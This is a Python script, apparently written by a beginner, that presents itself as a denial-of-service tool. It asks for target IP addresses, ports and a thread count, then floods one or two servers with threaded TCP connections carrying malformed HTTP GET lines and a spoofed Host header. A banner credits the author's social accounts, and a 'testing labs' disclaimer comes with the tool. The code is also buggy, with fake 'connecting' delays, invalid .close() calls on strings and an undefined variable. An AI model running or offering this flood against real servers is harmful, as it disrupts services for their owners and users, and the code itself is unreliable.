import threading
import socket
from time import sleep

print('''.........______  _______ _______    _______ ______  _______ _______ _______
        (  __  \(  __   (  ____ \  / ___   / ___  \(  ____ (  ____ (       )
        | (  \  | (  )  | (    \/  \/   )  \/   \  | (    \| (    \| () () |
        | |   ) | | /   | (_____       /   )  ___) | (__   | (__   | || || |
        | |   | | (/ /) (_____  )     /   /  (___ (|  __)  |  __)  | |(_)| |
        | |   ) |   / | |     ) |    /   /       ) | (     | (     | |   | |
        | (__/  |  (__) /\____) |   /   (_//\___/  | (____/| (____/| )   ( |
        (______/(_______\_______)  (_______\______/(_______(_______|/     \|

      Twitter: https://twitter.com/z3_56?lang=ar
      Instagram: https://www.instagram.com/z3_56/
      Youtube: https://www.youtube.com/channel/UCXAE4Nl41EvyIP0ZyrEa2pQ
      i'm a beginner of programming if you have any advice Just Tell me (:''')
print(".")
input("enter any key to start ")
print(".")

print("..{*} Welcome To My Tool for DoS Attack (:")

Kl = input('''________________________________________________________________
|                         !!!ATTENTION!!!                      |
|--------------------------------------------------------------|
|                    This Attack for testing labs              |
|                if you use this to do a Illegal acts          |
|                                                              |
|                             You will be                      |
|                                                              |
|                         (((!!!tracked!!!)))                  |
|                          By server owner                     |
|______________________________________________________________|

you need to continue??[Y/n]: ''')

if Kl == 'n':
    Kl.close()

if Kl == 'Y':
    la = input("Are you want to use a Multi Attack? (Attack a 2 Servers) [Y/n]: ")
    if la == 'Y':
        input("enter any key")
        target = input('Enter The Target1 IP   : ')
        threads = int(input('Enter The Threads      : '))
        port: int = int(input('Enter The Port1        : '))
        target1 = input('Enter The Target2 IP   : ')
        port1:int = int(input('Enter The Port2        : '))

        print("{*} Connecting to targets...")
        sleep(6)
        Kl2 = input("..{*} already Connected! Are you ready to attack?[Y/n]: ")

        if Kl2 == 'n':
            Kl2.close()

        already_connected = 0

        def attack():
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.connect((target1, port1))
            s.sendto(("GET /" + target1 + "HTTP/1.1\r\n").encode('ascii'), (target1, port1))
            s.close()
        def attack2():
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target1, port1))
            s.sendto(("GET /" + target1 + "HTTP/1.1\r\n").encode('ascii'), (target1, port1))
            s.close()


        for i in range(threads):
            thread = threading.Thread(target=attack)
            thread2 = threading.Thread(target=attack2)
            thread.start()
            thread2.start()
            print("Attack is runing!!! on IP " + target + " 100%")
            print("Attack is runing!!! on IP " + target1 + " 100%")

        print(
            "{*}attack has been stop! Thank you to use my tool <3 See you later & Do not Forget to follow Me in IG & YT & TW <:")
        print("{*}Going out...")
    sleep(8)

##################################################################################

if la == 'n':
    target = input('Enter The Target IP   : ')
    threads = int(input('Enter The Threads     : '))
    port: int = int(input('Enter The Port        : '))
    fake_ip = '8.8.8.8'

    print("{*} Connecting to target...")
    sleep(6)
    Kl2 = input("..{*} already Connected! Are you ready to attack?[Y/n]: ")

    if Kl2 == 'n':
        Kl2.close()

    already_connected = 0


    def attack():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()


    for i in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()
        print("Attack is runing!!! on IP " + target + " 100%")

    print(
        "{*}attack has been stop! Thank you to use my tool <3 See you later & Do not Forget to follow Me in IG & YT & TW <:")
    print("{*}Going out...")
    sleep(8)